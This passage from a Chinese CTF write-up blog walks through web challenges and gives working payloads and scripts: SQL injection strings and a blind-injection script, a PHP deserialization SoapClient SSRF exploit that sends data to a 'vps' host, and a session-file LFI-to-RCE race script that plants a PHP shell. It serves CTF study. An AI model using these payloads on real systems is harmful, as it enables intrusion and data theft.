keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no no no!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"Longlone"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag: <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>url编码脚本</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Longlone'</span><span class="token punctuation">;</span> <span class="token comment">//需要二次编码的字符或字符串</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$char</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ascii1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$ascii1</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$ascii1</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ascii2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$ascii2</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$ascii2</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'%'</span><span class="token punctuation">.</span><span class="token variable">$ascii1</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'%'</span><span class="token punctuation">.</span><span class="token variable">$ascii2</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$char</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$char</span><span class="token punctuation">.</span><span class="token single-quoted-string string">': '</span><span class="token punctuation">.</span><span class="token variable">$aaa</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>                <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token punctuation">.</span><span class="token variable">$aaa</span><span class="token punctuation">;</span>                <span class="token keyword">break</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>payload:<code>?id=%4%43%6%46%6%45%6%37%6%43%6%46%6%45%6%35</code></p><h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111302157152.png"><br><code>floor报错注入</code><br>payload:<br>注库：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(schema_name) from information_schema.schemata),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注表：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;true____flag&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注列：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;syclover&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>flag:<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(flag) from true____flag.syclover),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p><code>right函数</code></p><pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);+------------------+| RIGHT(&#39;MySQL&#39;,3) |+------------------+| SQL              |+------------------+1 row in set (0.00 sec)</code></pre><p><code>left函数</code></p><pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);+-----------------------+| LEFT(&#39;MySQL LEFT&#39;, 5) |+-----------------------+| MySQL                 |+-----------------------+1 row in set</code></pre><p><code>mid函数</code>—–和substr差不多</p><pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);+-------------------+| mid(&#39;adbdab&#39;,3,2) |+-------------------+| bd                |+-------------------+1 row in set (0.01 sec)</code></pre><p>substr被过了就用上面三个代替</p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>bool盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl<span class="token operator">=</span><span class="token string">'http://47.100.242.70:4725/check.php'</span>strr<span class="token operator">=</span>string<span class="token punctuation">.</span>printableres<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> strr<span class="token punctuation">:</span>        <span class="token comment">#payload="admi'or(mid(database(),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        <span class="token comment">#payload="admi'or(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='easysql')),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        <span class="token comment">#payload="admi'or(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='syclover')),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        payload<span class="token operator">=</span><span class="token string">"admi'or(mid((select(group_concat(pwd))from(easysql.syclover)),&#123;&#125;,1)='&#123;&#125;')='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>s<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"pwd"</span><span class="token punctuation">:</span><span class="token string">"adm"</span><span class="token punctuation">,</span><span class="token string">"wp-submit"</span><span class="token punctuation">:</span><span class="token string">"%E7%99%BB%E5%BD%95"</span><span class="token punctuation">&#125;</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'wrong password'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            res<span class="token operator">+=</span>s            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>空格过了用<code>()</code>,<code>substr</code>被过用<code>mid</code></p><h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fxxk</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$kelasi</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$par0</span><span class="token punctuation">,</span><span class="token variable">$par1</span><span class="token punctuation">,</span><span class="token variable">$par2</span><span class="token punctuation">,</span><span class="token variable">$par3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0 <span class="token operator">=</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1 <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2 <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">=</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">par0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1<span class="token punctuation">,</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'syclover    !'</span><span class="token punctuation">.</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi<span class="token punctuation">.</span><span class="token single-quoted-string string">'     yyds'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//$ser = serialize($this -> kelasi);</span>        <span class="token comment">//$unser = unserialize($ser);</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi <span class="token operator">-</span><span class="token operator">></span> <span class="token function">juts_a_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">==</span> <span class="token single-quoted-string string">'unser'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        @<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">.</span><span class="token single-quoted-string string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>首先<code>__wakeup</code>里用伪协议读取<code>hint.php</code></p><p><code>$this-&gt;par2=php://filter/read=convert.base64-encode/resource=./</code></p><p><code>hint.php</code> </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'向管理员的页面post一个参数message(告诉他，"iwantflag") 和 另一个参数 url（它会向这个url发送一个flag'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'管理员的页面在当前目录下一个特殊文件夹里'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)'</span><span class="token punctuation">;</span></span></code></pre><p>通过<code>newOne()</code>使用原生类<code>FilesystemIterator</code>读取目录</p><p>读取两次</p><p><code>/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p><p>然后<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012339716.png"><br>这个只能读一行，只有个<code>&lt;?php</code></p><p>接下来<code>SoapClient打SSRF</code></p><p>官方exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fxxk</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$kelasi</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par2</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par3</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$par1</span><span class="token punctuation">,</span><span class="token variable">$par2</span><span class="token punctuation">,</span><span class="token variable">$par3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0 <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1 <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2 <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">=</span> <span class="token variable">$par3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$postdata</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'message=iwantflag&amp;url=http://vps:9999'</span><span class="token punctuation">;</span><span class="token comment">//按要求设置post数据</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'http://127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php'</span><span class="token punctuation">;</span><span class="token comment">//payload1 = new fxxk('','','php://filter/read=convert.base64-encode/resource=./','');#伪协议读hint</span><span class="token comment">//payload2 = new fxxk('FilesystemIterator','./',1,'echoo');#列目录</span><span class="token comment">//payload3 = new fxxk('FilesystemIterator','./aaaaaaaaaaafxadwagaefae',1,'echoo');#列目录</span><span class="token variable">$payload4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fxxk</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'SoapClient'</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'wupco'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Content-Type:'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Application/X-WWW-Form-Urlencoded'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Content-Length:'</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$postdata</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!!!'</span><span class="token punctuation">.</span><span class="token variable">$postdata</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'baaa'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$soa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"\r\n"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$soa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012348807.png"></p><h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p>验证码ocr</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112020019531.png"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">import</span> re<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> ddddocr<span class="token keyword">import</span> onnxruntime<span class="token keyword">import</span> requests<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodeurl <span class="token operator">=</span> <span class="token string">"http://110.42.233.91:88/access"</span>sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>ocr <span class="token operator">=</span> ddddocr<span class="token punctuation">.</span>DdddOcr<span class="token punctuation">(</span>use_gpu<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>onnxruntime<span class="token punctuation">.</span>set_default_logger_severity<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pic_to_text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"base64,(.*?)>"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"v_code_LA.png"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>img<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    v_code <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"v_code_LA.png"</span><span class="token punctuation">)</span>    v_code<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span>    v_code<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"v_code.png"</span><span class="token punctuation">)</span>    v_code_bytes <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'v_code.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> ocr<span class="token punctuation">.</span>classification<span class="token punctuation">(</span>v_code_bytes<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"v_code.png"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> code<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    cnt <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"done (.*?) times"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> cnt <span class="token operator">==</span> <span class="token number">1000</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span>    code <span class="token operator">=</span> pic_to_text<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"v_code"</span><span class="token punctuation">:</span> code    <span class="token punctuation">&#125;</span>    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        validate<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>不过这个脚本运行报错，等之后看看吧</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>geekchallenge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HECTF</title>
    <link href="/2021/11/16/HECTF/"/>
    <url>/2021/11/16/HECTF/</url>
    
    <content type="html"><![CDATA[<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>题目：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>session文件包含，写入shell到session文件</p><p>poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> requests<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor<span class="token punctuation">,</span> waittarget <span class="token operator">=</span> <span class="token string">'http://81.70.102.209:10040/index.php'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'aaaa'</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'load.png'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">40960</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">rf'''&lt;?php file_put_contents('/tmp/success', '&lt;?=system("cat /f1aggggggggggggggggggggggg");?>'); echo('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'); ?>'''</span></span><span class="token punctuation">&#125;</span>    <span class="token comment">#data = &#123;'PHP_SESSION_UPLOAD_PROGRESS': rf'''&lt;?php file_put_contents('/tmp/success', '&lt;?=system("ls /");?>'); ?>'''&#125;</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 